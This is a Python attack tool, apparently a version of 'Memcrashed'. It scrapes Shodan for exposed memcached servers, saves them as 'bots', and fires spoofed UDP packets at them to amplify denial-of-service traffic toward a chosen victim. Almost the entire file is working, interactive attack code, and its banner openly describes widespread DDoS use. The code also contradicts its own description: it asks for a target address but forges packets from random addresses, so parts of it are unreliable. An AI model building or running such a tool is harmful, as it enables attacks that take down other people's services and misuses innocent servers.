#-- coding: utf8 --
#!/usr/bin/env python3
import sys
import os
import time
import shodan
import ipaddress
import logging
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout
import datetime
from random import randint, uniform, choice
from threading import Thread

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def random_ip():
    return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"

def generate_payload():
    commands = [
        "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n",
        "\x00\x00\x00\x00\x00\x01\x00\x00stats cachedump 1 0\r\n",
        "\x00\x00\x00\x00\x00\x01\x00\x00get key\r\n"
    ]
    return choice(commands)

class Color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = Color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                        Author: @037
                                        Version: 4.0

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                      
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY = file.readline().strip()
else:
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
    with open('api.txt', 'w') as file:
        file.write(SHODAN_API_KEY)
        print('[~] File written: ./api.txt')

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
        if query.startswith('y'):
            print('[~] Checking Shodan.io API Key...')
            try:
                total_results = api.search('product:"Memcached" port:11211')['total']
                all_matches = []
                for page in range(1, (total_results // 100) + 2):
                    results = api.search('product:"Memcached" port:11211', page=page)
                    all_matches.extend(results['matches'])
                print(f'[~] Total bots retrieved: {len(all_matches)}')

                saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
                if saveresult.startswith('y'):
                    with open('bots.txt', 'w') as file2:
                        for result in all_matches:
                            file2.write(result['ip_str'] + "\n")
                    print('[~] File written: ./bots.txt')
            except shodan.APIError as e:
                print(f'[✘] Error: {e}')
                option = input('[*] Would you like to change the API Key? <Y/n>: ').lower()
                if option.startswith('y'):
                    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
                    with open('api.txt', 'w') as file:
                        file.write(SHODAN_API_KEY)
                        print('[~] File written: ./api.txt')
                    continue
                else:
                    print('[✘] Exiting...')
                    break

        if myresults.is_file() and input('[*] Use locally stored Shodan data? <Y/n>: ').lower().startswith('y'):
            with open('bots.txt') as my_file:
                ip_array = [line.strip() for line in my_file if is_valid_ip(line.strip())]
                print(f'[~] Total valid bots after filtering: {len(ip_array)}')
        else:
            ip_array = []
            print('[✘] Error: No valid bots found in bots.txt')

        if not ip_array:
            print('[✘] No valid bots available. Exiting...')
            break

        target = input("[▸] Enter target IP address: ").strip()
        if not is_valid_ip(target):
            print('[✘] Invalid target IP address. Exiting...')
            break

        try:
            targetport = int(input("[▸] Enter target port number (Default 80): ") or 80)
        except ValueError:
            print('[✘] Invalid target port. Exiting...')
            break

        try:
            power = int(input("[▸] Enter preferred power (Default 1): ") or 1)
        except ValueError:
            print('[✘] Invalid power value. Exiting...')
            break

        engage = input(f'[*] Ready to engage target {target}? <Y/n>: ').lower()
        if not engage.startswith('y'):
            print('[✘] Engagement canceled. Exiting...')
            break

        print('[*] Sending packets...')

        def send_payload(ip):
            src_ip = random_ip()
            payload = generate_payload()
            print(f'[+] Sending forged payloads to: {ip} from spoofed IP: {src_ip}')
            try:
                response = sr1(IP(src=src_ip, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=payload), timeout=2, verbose=0)
                if response:
                    print(f'[✓] Response received from {ip}')
                else:
                    print(f'[!] No response from {ip}')
            except Exception as e:
                print(f'[✘] Error while sending to {ip}: {e}')
            time.sleep(uniform(0.5, 2))  # Introduce random delays

        threads = []
        for ip in ip_array:
            t = Thread(target=send_payload, args=(ip,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print('[✓] Task complete! Exiting platform.')
        break

    except Exception as e:
        logging.error(f'Unexpected error: {e}')
        break
